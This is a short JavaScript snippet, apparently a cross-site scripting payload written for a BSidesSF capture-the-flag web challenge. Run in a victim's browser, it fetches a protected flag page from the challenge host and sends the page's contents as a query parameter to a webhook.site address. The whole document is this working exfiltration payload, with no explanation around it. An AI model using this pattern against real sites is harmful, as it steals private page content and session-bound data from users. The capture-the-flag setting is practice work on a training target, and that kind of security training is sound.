async function fetchData() {
  try {
    const response1 = await fetch('https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag');
    const data1 = await response1.text();
    console.log(data1);

    const response2 = await fetch(`https://webhook.site/054dd353-fdfa-452f-9788-f10aa127039c?id=${data1}`);
    const data2 = await response2.text();
    console.log(data2);
  } catch (error) {
    console.error(error);
  }
}
fetchData();
